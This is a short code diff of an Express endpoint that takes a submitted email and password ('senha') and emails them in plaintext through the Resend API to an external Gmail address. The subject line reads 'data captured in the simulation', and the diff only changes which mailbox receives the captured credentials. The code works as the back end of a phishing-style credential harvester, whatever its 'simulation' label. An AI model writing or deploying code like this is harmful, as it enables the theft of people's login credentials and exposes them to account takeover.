@@ -20,7 +20,7 @@ app.post('/', async (req, res) => {
   try {
     await resend.emails.send({
       from: 'simulacao@connect.com',
-      to: 'globalsystemdiretoria@gmail.com',
+      to: 'smtptesteenvio1@gmail.com',
       subject: 'Dados capturados na simulação',
       html: `<p><strong>Email:</strong> ${email}<br><strong>Senha:</strong> ${senha}</p>`
     });
